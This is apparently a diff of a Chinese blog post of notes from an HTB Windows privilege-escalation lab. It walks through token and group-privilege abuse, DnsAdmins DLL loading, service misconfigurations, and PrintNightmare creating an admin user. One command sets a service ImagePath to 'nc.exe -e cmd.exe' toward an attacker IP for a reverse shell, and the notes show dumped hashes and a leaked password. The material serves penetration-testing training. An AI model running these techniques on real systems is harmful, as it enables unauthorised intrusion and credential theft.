 <ol><li>在测试客户端的黄金映像Windows 工作站和服务器构建是否存在缺陷时</li><li>在本地提升权限以获取对某些本地资源（例如数据库）的访问权限</li><li>在加入域的计算机上获取<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" target="_blank" rel="noreferrer">NT AUTHORITY\System</a>级别访问权限，从而进入客户端的 Active Directory 环境</li><li>获取凭证以在客户端网络内横向移动或提升权限</li></ol>
@@ -4284,7 +4291,7 @@ Password: </code></pre>
 <p>模块的许多部分都需要一些工具，例如开源脚本、预编译二进制文件和漏洞利用 PoC。如果适用，这些工​​具可以在<code>C:\Tools</code>目标主机的目录中找到。尽管大多数工具都已提供，但您也可以挑战自己，尝试将文件上传到目标主机（使用文件传输模块中展示的技术），甚至可以使用<a href="https://visualstudio.microsoft.com/downloads/" target="_blank" rel="noreferrer">Visual Studio</a>自行编译一些工具。</p>
 <p><strong>Useful Tools</strong></p>
 <div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noreferrer">Seatbelt</a></td><td>用于执行各种本地权限提升检查的 C# 项目</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noreferrer">winPEAS</a></td><td>是一个脚本，用于在 Windows 主机上搜索可能的提权路径。所有检查的说明如下：</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" target="_blank" rel="noreferrer">PowerUp</a></td><td>用于查找依赖于错误配置的常见 Windows 提权向量的 PowerShell 脚本。它还可以用来利用已发现的一些问题。</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" target="_blank" rel="noreferrer">SharpUp</a></td><td>C# 版本的 PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" target="_blank" rel="noreferrer">JAWS</a></td><td>用 PowerShell 2.0 编写的用于枚举权限提升向量的 PowerShell 脚本</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noreferrer">SessionGopher</a></td><td>是一款 PowerShell 工具，用于查找并解密远程访问工具保存的会话信息。它可以提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noreferrer">Watson</a></td><td>是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noreferrer">LaZagne</a></td><td>用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地计算机上的密码的工具</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noreferrer">Windows Exploit Suggester - Next Generation</a></td><td>是一款基于 Windows 实用程序输出的工具<code>systeminfo</code>，它提供了操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方式。它支持 Windows XP 到 Windows 10 之间的所有 Windows 操作系统，包括其对应的 Windows Server 版本。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noreferrer">Sysinternals Suite</a></td><td>我们将在枚举中使用 Sysinternals 的几种工具，包括<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noreferrer">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" target="_blank" rel="noreferrer">PipeList</a>和<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" target="_blank" rel="noreferrer">PsService</a></td></tr></tbody></table></div>
-<h2>Getting the Lay of the Land</h2>
+<h2>态势感知与环境摸底</h2>
 <h3>态势感知</h3>
 <p>无论身处何种境地，无论是在日常生活中，还是在网络渗透测试等项目中，时刻把握时间和空间的定位都至关重要。</p>
 <p>收集网络信息是我们枚举的关键部分。我们可能会发现主机是双宿主的，而攻陷该主机可能使我们能够横向移动到之前无法访问的网络的另一部分。双宿主意味着主机或服务器属于两个或多个不同的网络，并且在大多数情况下具有多个虚拟或物理网络接口。我们应该始终查看路由表，以查看有关本地网络及其周围网络的信息。我们还可以收集有关本地域的信息（如果主机是Active Directory环境的一部分），包括域控制器的IP地址。使用arp命令查看每个接口的ARP缓存并查看主机最近与之通信的其他主机也很重要。这可以帮助我们在获取凭据后进行横向移动。它可以很好地指示管理员正在通过RDP或WinRM从该主机连接到哪些主机。</p>
@@ -4457,7 +4464,7 @@ PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows
 <ul><li><code>OS name</code> <code>系统名称</code> ：了解 Windows 作系统的类型（工作站或服务器）和级别（Windows 7 或 10，Server 2008、2012、2016、2019 等）可以让我们了解遗留系统中可能可用的工具类型（如 <code>PowerShell</code> 版本），或是否缺乏这些工具。这也能识别可能存在公开漏洞利用的作系统版本。</li><li><code>Version</code>: 与作系统版本类似，可能存在针对特定 Windows 版本漏洞的公开漏洞利用。Windows 系统漏洞可能导致系统不稳定甚至彻底崩溃。在任何生产系统上运行这些程序时都要小心，确保在运行前充分了解漏洞及其可能的后果。</li><li><code>Running Services</code> <code>运行服务</code> ：了解主机上运行的服务很重要，尤其是那些以 <code>NT AUTHORITY\SYSTEM</code> 或管理员级账户运行的服务。在特权账户中运行的服务配置错误或易受攻击，往往是权限升级的轻松优势。</li></ul>
 <h4>系统信息</h4>
 <p>查看系统本身能让我们更好地了解具体作系统版本、使用的硬件、已安装的程序和安全更新。这将帮助我们缩小寻找缺失补丁及相关 CVE 的范围，以便升级权限。使用<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist" target="_blank" rel="noreferrer">Tasklist</a>命令查看正在运行的进程，可以让我们更好地了解系统当前运行的应用程序。</p>
-<p><strong>Tasklist</strong></p>
+<pre><code class="language-cmd">Tasklist</code></pre>
 <pre><code class="language-cmd-session">C:\htb&gt; tasklist /svc
 
 Image Name                     PID Services
@@ -4785,7 +4792,7 @@ Lockout duration (minutes):                           30
 Lockout observation window (minutes):                 30
 Computer role:                                        SERVER
 The command completed successfully.</code></pre>
-<h3>与Processes通信</h3>
+<h3>与进程交互</h3>
 <p>寻找权限升级的最佳地点之一是系统上正在运行的进程。即使进程不以管理员身份运行，也可能获得额外的权限。最常见的例子是发现一台像 IIS 或 XAMPP 这样的 Web 服务器运行在主机上，放置 <code>aspx/php</code> shell，并以运行 Web 服务器的用户身份获得 shell。通常，这不是管理员，但通常会有 <code>SeImpersonate</code> 令牌，允许 <code>Rogue/Juicy/Lonely Potato</code> 提供系统权限。</p>
 <p><strong>Access Tokens 访问令牌</strong> 在 Windows 中， 访问令牌用于描述进程或线程的安全上下文（安全属性或规则）。令牌包含用户账户身份信息以及与特定进程或线程相关的权限。当用户向系统进行身份验证时，其密码会通过安全数据库进行验证，如果正确认证，他们将获得一个访问令牌。每当用户与进程交互时，都会显示该令牌的副本以确定其权限等级。</p>
 <h3>枚举网络服务</h3>
@@ -4847,7 +4854,7 @@ Active Connections
 
 &lt;SNIP&gt;</code></pre>
 <p>使用主动网络连接时，主要要注意的是那些在环回地址（<code>127.0.0.1</code> 和 <code>：：1</code>）上监听的条目，这些条目没有监听 IP 地址（<code>10.129.43.8</code>）或广播地址（<code>0.0.0.0</code>，<code>：：/0</code>）。原因是 localhost 上的网络套接字通常不安全，因为人们认为“它们无法被网络访问”。最明显的是 <code>14147</code> 号端口，用于 FileZilla 的管理界面。通过连接该端口，除了作为 FileZilla 服务器用户（可能是管理员）创建 f.P 共享的 c：\外，可能还能提取 FTP 密码。</p>
-<h3>Named Pipes</h3>
+<h3>命名管道</h3>
 <p>进程之间的另一种通信方式是通过命名管道。管道本质上是存储在内存中的文件，读取后会被清除。钴打击为每个命令（不含 <a href="https://www.cobaltstrike.com/help-beacon-object-files" target="_blank" rel="noreferrer">BOF</a>）使用命名管道。工作流程基本如下：</p>
 <p>信标启动了一条名为 \.\pipe\ 的管道 msagent_12</p>
 <p>信标启动一个新进程，并向该进程注入命令，将输出导向 \.\pipe\msagent_12</p>
@@ -5001,7 +5008,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
 <p><strong>Detection  检测</strong></p>
 <p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" target="_blank" rel="noreferrer">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" target="_blank" rel="noreferrer">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. 本文值得[](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e)一读，了解更多关于 Windows 权限以及检测和防止滥用的信息，特别是通过记录事件 4672：分配给新登录的特殊权限 ，如果新登录会话被分配了某些敏感权限，该事件将引发事件。这可以通过多种方式进行微调，比如监控_不应_被分配的权限，或只应分配给特定账户的权限。</p>
-<h3>Selmpersonate and SeAssignPrimaryToken</h3>
+<h3>SeImpersonate 与 SeAssignPrimaryToken 权限</h3>
 <p>在 Windows 中，每个进程都有一个令牌，里面包含运行该账户的信息。这些令牌不被视为安全资源，因为它们只是内存中可能被无法读取内存的用户暴力破解的内存位置。要使用该令牌，需要具备<code>冒充</code>特权。该保护仅授予管理账户，且在大多数情况下可在系统加固过程中移除。使用该令牌的一个例子是 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" target="_blank" rel="noreferrer">CreateProcessWithTokenW</a>。</p>
 <p>合法程序可以利用其他进程的令牌从管理员升级到本地系统，后者拥有额外权限。进程通常通过调用 WinLogon 进程获取 SYSTEM 令牌，然后用该令牌执行自身，并将其置于 SYSTEM 空间中。攻击者常在“土豆式”私密账户中滥用此权限——服务账户可以<code>冒充</code> ，但无法获得完整的系统级权限。本质上，Potato 攻击欺骗以 SYSTEM 运行的进程连接到其进程，进进程交出供使用的令牌。</p>
 <p>我们通常会在通过在服务账户上下文中运行的应用程序获得远程代码执行后获得此权限（例如，将网页壳上传到 ASP.NET 的网页应用，通过 Jenkins 安装实现远程代码执行，或通过 MSSQL 查询执行命令）。每当我们通过这种方式获得访问权限时，应立即检查是否有权限，因为它的存在通常为获得更高权限提供了快速且便捷的途径。本文值得一读，以了解更多关于代币冒充攻击的细节。</p>
@@ -5124,7 +5131,7 @@ C:\Windows\system32&gt;whoami
 
 whoami
 nt authority\system</code></pre>
-<h3>SeDebugPrivilege</h3>
+<h3>SeDebugPrivilege 调试权限</h3>
 <p>为了运行某个特定应用程序或服务或协助故障排除，用户可能会被分配 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" target="_blank" rel="noreferrer">SeDebugPrivilege</a>，而不是将该账户添加到管理员组中。该权限可以通过本地或域组策略在 <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code> .默认情况下，只有管理员拥有此权限，因为它可用于从系统内存中捕获敏感信息，或访问/修改内核和应用结构。该权利可能分配给需要在日常工作中调试新系统组件的开发者。该用户权利应谨慎授予，因为任何被分配的账户都会访问关键作系统组件。</p>
 <p>在内部渗透测试中，利用 LinkedIn 等网站收集潜在用户信息以进行定位通常很有帮助。假设我们正在使用 <code>Responder</code> 或 <code>Inveigh</code> 获取许多 NTLMv2 密码哈希值。在这种情况下，我们可能想将破解密码哈希的努力重点放在可能的高价值账户上，比如更可能被分配此类权限的开发者。用户可能不是主机的本地管理员，但拥有我们无法用 BloodHound 等工具远程枚举的权利。在我们为多个用户获取凭证，并且拥有一个或多个主机的 RDP 访问权限但没有额外权限的环境下，这点值得检查。</p>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png" alt="Pasted image 20260228032219" />
@@ -5236,7 +5243,7 @@ winlogon.exe                   612 Console                    1     10,408 K</co
 <p>我们也可以使用 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2" target="_blank" rel="noreferrer">Get-Process</a> cmdlet 抓取一个知名进程（如 LSASS）的 PID，并直接传递给脚本，从而减少所需的步骤。</p>
 <img src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png" alt="Pasted image 20260228040031" />
 <p>还有类似这样的工具，可以在我们有 <code>SeDebugPrivilege</code> 时弹出 SYSTEM shell。通常我们无法通过 RDP 访问主机，因此必须修改 PoC，要么将反向 shell 返回攻击主机，作为 SYSTEM，要么通过其他命令，比如添加管理员用户。试着玩玩这些 PoC，看看还有什么其他方式可以实现 SYSTEM 访问，尤其是当你没有完全交互式的会话时，比如实现命令注入，或者作为 <code>SeDebugPrivilege</code> 的用户拥有网页壳或反向 shell 连接。请记住这些例子，以防你遇到倾销 LSASS 无法获得有用凭证的情况（虽然我们可以通过机器的 NTLM 哈希获得 SYSTEM 访问权限，但这超出本模块范围），并且用 shell 或 RCE 作为 SYSTEM 会很有帮助。</p>
-<h3>SeTakeOwnershipPrivilege</h3>
+<h3>SeTakeOwnershipPrivilege 取得所有权权限</h3>
 <p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" target="_blank" rel="noreferrer">SeTakeOwnershipPrivilege</a> 赋予用户对任何“可保护对象”的所有权，即 Active Directory 对象、NTFS 文件/文件夹、打印机、注册表键、服务和进程。该权限赋予 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" target="_blank" rel="noreferrer">WRITE_OWNER</a> 对对象的权利，意味着用户可以在对象的安全描述符内更改所有者。管理员默认被赋予此权限。虽然很少遇到具有此权限的标准用户账户，但我们可能会遇到例如被赋予该权限的服务账户，负责运行备份作业和 VSS 快照。它还可能被赋予一些其他账户，如 <code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> 和 <code>SeSecurityPrivilege</code>，以更细致地控制该账户的权限，而不赋予账户完整的本地管理员权限。这些特权本身很可能被用来升级特权。不过，有时我们可能需要对特定文件负责，因为其他方法被阻挡，或者其他方法无法如预期般工作。滥用这种特权有点特殊。不过，深入理解还是值得的，尤其是因为在 Active Directory 环境中，我们可能会遇到这样一种情景，可以将这项权利分配给特定用户，并利用它来读取文件共享上的敏感文件。</p>
 <p><strong>WRITE_OWNER 权限</strong> 意思是：</p>
 <blockquote>你可以修改对象的 Owner 字段。</blockquote>
@@ -5352,12 +5359,12 @@ root:n1X_p0wer_us3er!</code></pre>
 %WINDIR%\system32\config\security.sav
 %WINDIR%\system32\config\software.sav
 %WINDIR%\system32\config\system.sav</code></pre>
-<h2>Windows Group Privileges</h2>
+<h2>Windows 组权限</h2>
 <p><strong>Windows Built-in</strong></p>
 <p>如 <code>Windows 权限概览</code>部分所述，Windows 服务器，尤其是域控制器，内置了多种组，这些组要么随作系统自带，要么在系统安装 Active Directory 域服务角色以将服务器升级为域控制器时添加。许多这些组织会赋予成员特殊权限，有些甚至可以用于提升服务器或域控制器的权限。 这里列出了所有内置的 Windows 组，并附有每个组的详细描述。本页面详细列出了 Active Directory 中特权账户和组的列表。无论我们是否访问了其中一个或多个成员账户，或在评估过程中发现自己在其中一个或多个群体中存在过多/不必要的成员身份，都必须理解这些群体成员身份的影响。在我们的目的上，我们将重点介绍以下内置组。这些组从 Server 2008 R2 一直存在至今，除了 Hyper-V 管理员（由 Server 2012 引入）。</p>
 <p>账户可以分配给这些组，以强制执行最小权限，避免为执行特定任务（如备份）而创建更多域管理员和企业管理员。有时供应商应用还会要求某些权限，可以通过将服务账户分配给这些组之一来获得。账户也可能因意外添加，或在测试特定工具或脚本后遗留。我们应始终检查这些小组，并在报告中附录每个小组成员名单，供客户审核并判断是否仍需访问。</p>
 <div class="post-table-wrap"><table><thead><tr><th>备用</th><th>事件日志阅读器</th><th>管理员</th></tr></thead><tbody><tr><td>管理员</td><td>打印</td><td>服务器运营者</td></tr></tbody></table></div>
-<h3>Backup Operators</h3>
+<h3>Backup Operators 备份操作员</h3>
 <p>在登录到目标机器后，我们可以使用命令 <code>whoami /groups</code> 显示当前的组成员。加入该组成员可获得 <code>SeBackup</code> 和 <code>SeRestore</code> 的特权。<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" target="_blank" rel="noreferrer">SeBackupPrivilege</a> 允许我们遍历任何文件夹并列出文件夹内容。这样即使文件夹的访问控制列表（ACL）中没有访问控制条目（ACE），也能让我们从文件夹复制文件。然而，我们无法使用标准的复制命令来实现这一点。相反，我们需要程序化地复制数据，并确保指定 <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" target="_blank" rel="noreferrer">FILE_FLAG_BACKUP_SEMANTICS</a> 标志。</p>
 <p><strong>如何在未获得必要权限的情况下访问敏感信息。</strong></p>
 <p>我们可以利用这个 <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank" rel="noreferrer">PoC</a> 来利用 <code>SeBackupPrivilege</code>，复制这个文件。首先，让我们在 PowerShell 会话中导入库。</p>
@@ -5604,7 +5611,7 @@ printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:
    Speed :           356962042 Bytes/sec.
    Speed :           20425.531 MegaBytes/min.
    Ended : Thursday, May 6, 2021 1:11:47 PM</code></pre>
-<h3>Event Log Readers</h3>
+<h3>Event Log Readers 事件日志读取者</h3>
 <p>假设启用了对进程创建事件及相应命令行值的审计 。此时，该信息会作为事件 ID 4688 保存到 Windows 安全事件日志中：新进程已创建 。组织可以支持进程命令行的日志记录，帮助防御者监控和识别可能的恶意行为，识别系统中不应存在的二进制文件。这些数据可以被传输到 SIEM 工具，或导入搜索工具（如 ElasticSearch），以便防御者了解网络系统中运行的二进制文件。这些工具随后会标记任何潜在的恶意活动，比如市场营销主管工作站运行的 <code>whoami</code>、<code>netstat</code> 和<code>任务列表</code>命令。</p>
 <p>在 Windows 安全日志中： <strong>4688 = 新进程已创建（A new process has been created）</strong></p>
 <p>也就是：</p>
@@ -5644,7 +5651,7 @@ CommandLine
 -----------
 net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
 <p>该 cmdlet 也可以作为另一个用户使用 <code>-Credential</code> 参数运行。 其他日志包括 PowerShell 作日志，如果启用脚本块或模块日志，可能还包含敏感信息或凭证。该日志对无权限用户开放。</p>
-<h3>DnsAdmins</h3>
+<h3>DnsAdmins DNS 管理员</h3>
 <p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" target="_blank" rel="noreferrer">DnsAdmins</a> 组的成员可以访问网络上的 DNS 信息。Windows DNS 服务支持自定义插件，并能调用插件中的函数来解决不在任何本地托管 DNS 区域范围内的名称查询。DNS 服务以 <code>NT AUTHORITY\SYSTEM</code> 形式运行，因此该组成员身份可能被用来提升域控制器的权限，或在有独立服务器作为该域的 DNS 服务器时升级。可以使用内置的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" target="_blank" rel="noreferrer">dnscmd</a> 工具来指定插件 DLL 的路径。正如这篇优秀文章中详细说明的，当域名控制器上运行 DNS 时（非常常见）可以实施以下攻击：</p>
 <p>管理通过 RPC 进行</p>
 <p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" target="_blank" rel="noreferrer">ServerLevelPluginDll</a> 允许我们加载自定义 DLL，且无需对 DLL 路径进行任何验证。这可以通过命令行中的 <code>dnscmd</code> 工具完成</p>
@@ -5679,14 +5686,15 @@ Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
 <p>Press enter or click to view image in full size</p>
 <img src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png" alt="Referenced image" />
 <ol><li>在 cmd 中停止和开始 DNS：</li></ol>
-<p>sc stop dns sc start dns</p>
+<pre><code class="language-cmd">sc stop dns
+sc start dns</code></pre>
 <img src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png" alt="Referenced image" />
 <p>然后我们得到一个反向壳同时：</p>
 <p>Press enter or click to view image in full size</p>
 <img src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png" alt="Referenced image" />
 <p>now you can get the flag on:</p>
-<p>c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</p>
-<h3>Print Operators</h3>
+<pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
+<h3>Print Operators 打印操作员</h3>
 <p>打印操作员组是另一个权限极高的组，它赋予其成员<code>SeLoadDriverPrivilege</code>管理、创建、共享和删除连接到域控制器的打印机的权限，以及本地登录域控制器并将其关闭的权限。如果我们发出命令<code>whoami /priv</code>，并且在非提升权限的上下文中看不到该组<code>SeLoadDriverPrivilege</code>，则需要绕过用户帐户控制 (UAC)。</p>
 <ol><li>确认权限</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; whoami /priv
@@ -5812,7 +5820,7 @@ NTSTATUS: c000010e, WinError: 0</code></pre>
 Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes
 
 The operation completed successfully.</code></pre>
-<h3>Server Operators</h3>
+<h3>Server Operators 服务器操作员</h3>
 <p>服务器运营者组允许成员无需分配域管理员权限即可管理 Windows 服务器。这是一个非常高权限的组，可以本地登录服务器，包括域控制器。 加入该组可获得强大的 <code>SeBackupPrivilege</code> 和 <code>SeRestorePrivilege</code> 权限，并能控制本地服务。</p>
 <p>让我们来看看 <code>AppReadiness</code> 服务。我们可以确认，该服务是通过 <code>sc.exe</code> 工具作为 SYSTEM 启动的。</p>
 <ol><li>查询 AppReadiness 服务</li></ol>
@@ -5933,15 +5941,15 @@ Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e967034871
 Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
 Administrator:des-cbc-md5:d60dfbbf20548938
 [*] Cleaning up...</code></pre>
-<h2>Attacking the OS</h2>
-<h3>User Account Control</h3>
+<h2>攻击操作系统</h2>
+<h3>用户账户控制 UAC</h3>
 <ol><li><strong>UAC（用户账户控制）</strong>是 Windows 的一项安全机制，用来：</li></ol>
 <p>关键特点：</p>
 <p>但需要注意：</p>
 <ul><li>在程序需要 <strong>管理员权限</strong> 时弹出确认提示</li><li>防止系统被 <strong>未经授权的程序修改</strong></li><li>默认情况下，程序都以 <strong>普通用户权限（Standard User）</strong> 运行</li><li>只有管理员 <strong>明确允许</strong> 时才会提升为管理员权限</li><li>主要目的是 <strong>减少误操作和恶意软件影响</strong></li></ul>
 <blockquote>不是严格的安全边界（not a security boundary），只是一个防护层。</blockquote>
 <blockquote>攻击者如果已经在系统里，仍然可能通过 <strong>UAC Bypass</strong> 提权。</blockquote>
-<h3>Weak Permissions</h3>
+<h3>弱权限配置</h3>
 <p>系统的权限设置复杂且具有挑战性。一个地方的轻微修改可能会在其他地方出现缺陷。作为渗透测试人员，我们需要了解 Windows 中的权限工作原理，以及错误配置如何被利用来提升权限。本节讨论的权限相关缺陷在大型厂商发布的软件应用中相对较少见（但偶尔会出现），而在较小厂商的第三方软件、开源软件和定制应用中则很常见。服务通常以系统权限安装，因此利用服务权限相关的缺陷往往能实现对目标系统的完全控制。无论环境如何，我们都应始终检查权限薄弱，并且既能借助工具，也能手动作，以防工具不方便使用。</p>
 <p><strong>这里介绍了四类提权</strong></p>
 <ol><li>文件可写 -&gt; 替换服务exe</li><li>服务可控 -&gt; 改<code>binpath</code></li><li>路径未加引号 -&gt; 抢跑执行恶意exe</li><li>注册表可写 -&gt; 改<code>ImagePath</code>或自启动项</li></ol>
@@ -5979,11 +5987,11 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p><strong>概念</strong>: 如果服务路径中包含空格但没有使用引号包裹，Windows 在解析路径时会尝试多个可能的执行路径，攻击者可以在这些路径中放置恶意程序，从而劫持服务执行。</p>
 <p><strong>利用步骤</strong></p>
 <p><strong>① 枚举未加引号的服务路径</strong>: 查找自动启动且路径未被引号包裹的服务。</p>
-<p>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</p>
+<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
 <p><strong>② 查看服务配置</strong>：确认服务路径以及运行权限。</p>
-<p>sc qc SystemExplorerHelpService</p>
+<pre><code class="language-cmd">sc qc SystemExplorerHelpService</code></pre>
 <p><strong>③ 在可利用路径放置恶意程序</strong>：例如创建恶意程序：</p>
-<p>C:\Program.exe</p>
+<pre><code class="language-cmd">C:\Program.exe</code></pre>
 <p><strong>④ 等待服务启动</strong>：可以通过服务重启或系统重启触发。</p>
 <p>作用： Windows 会优先执行攻击者放置的恶意程序，从而以 <strong>SYSTEM 权限执行代码</strong>。</p>
 <hr />
@@ -5993,22 +6001,22 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p><strong>① 枚举服务注册表权限</strong>：查找拥有写权限的服务注册表项。</p>
 <p>accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services</p>
 <p><strong>② 修改服务执行路径</strong>：将 <code>ImagePath</code> 修改为攻击者控制的程序。</p>
-<p>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</p>
+<pre><code class="language-powershell">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></pre>
 <p><strong>③ 启动服务</strong></p>
-<p>sc start ModelManagerService</p>
+<pre><code class="language-cmd">sc start ModelManagerService</code></pre>
 <p>作用： 服务启动时会执行新的 <code>ImagePath</code>，从而以 <strong>SYSTEM 权限运行攻击代码</strong>。</p>
 <hr />
 <ol><li>Modifiable Registry Autorun Binary（可修改启动项程序）</li></ol>
 <p><strong>概念</strong>: Windows 在系统启动或用户登录时会自动执行某些程序，如果攻击者可以修改这些启动项对应的程序或路径，就可以在用户登录时执行恶意代码实现提权。</p>
 <p><strong>利用步骤</strong></p>
 <p><strong>① 枚举系统启动项</strong>: 查看系统和用户登录时自动运行的程序。</p>
-<p>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</p>
+<pre><code class="language-powershell">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></pre>
 <p><strong>② 检查启动程序权限</strong>：确认是否可以修改或替换该程序。</p>
 <pre><code>icacls &lt;startup program path&gt;</code></pre>
 <p>③ 替换启动程序：用攻击者控制的程序替换原文件。</p>
 <p>④ 等待用户登录或系统启动</p>
 <p>作用： 当对应用户登录或系统启动时，Windows 会自动执行恶意程序，从而获得更高权限。</p>
-<h2>Kernel Exploits</h2>
+<h2>内核漏洞利用</h2>
 <p>在这台 <strong>HTB Windows 提权实验机</strong> 上，按本节的 <strong>3 个示例</strong> 各跑一遍，把权限提到 <strong><code>NT AUTHORITY\SYSTEM</code></strong>，最后读取 <strong>Administrator Desktop</strong> 上的 flag。</p>
 <p>这 3 个示例分别是：</p>
 <ol><li><strong>HiveNightmare / SeriousSam</strong></li></ol>
@@ -6018,57 +6026,57 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <ol><li><strong>CVE-2020-0668 + Mozilla Maintenance Service</strong></li></ol>
 <ul><li>利用任意文件移动漏洞，把你可控的恶意程序放进 SYSTEM 服务路径</li><li>启动服务拿 SYSTEM shell</li></ul>
 <h3>一、PrintNightmare</h3>
-<h4>先检查 Spooler 是否开启</h4>
+<h4>先检查 Spooler 打印后台服务是否开启</h4>
 <p>在目标机 PowerShell：</p>
-<p>ls \\localhost\pipe\spoolss</p>
+<pre><code>ls \\localhost\pipe\spoolss</code></pre>
 <p>如果看到 <code>spoolss</code>，说明打印服务在跑，可以继续。</p>
 <hr />
 <h4>绕过执行策略</h4>
-<p>Set-ExecutionPolicy Bypass -Scope Process</p>
+<pre><code class="language-powershell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
 <p>输入 <code>A</code> 确认。</p>
 <hr />
 <h4>导入脚本并添加管理员用户</h4>
 <p>假设题目环境里已经给了 <code>CVE-2021-1675.ps1</code>，执行：</p>
-<p>Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</p>
+<pre><code class="language-powershell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
 <p>成功时一般会看到类似：</p>
 <ul><li>created payload</li></ul>
 <ul><li>added user hacker as local administrator</li></ul>
 <hr />
 <h4>验证新用户</h4>
-<p>net user hacker</p>
+<pre><code class="language-cmd">net user hacker</code></pre>
 <p>或者：</p>
-<p>net localgroup administrators</p>
+<pre><code class="language-cmd">net localgroup administrators</code></pre>
 <hr />
-<h4>用新用户拿管理员 shell</h4>
+<h4>使用新用户获取管理员 Shell</h4>
 <p>如果 RDP 允许，直接重新登录：</p>
 <ul><li>用户：<code>hacker</code></li></ul>
 <ul><li>密码：<code>Pwnd1234!</code></li></ul>
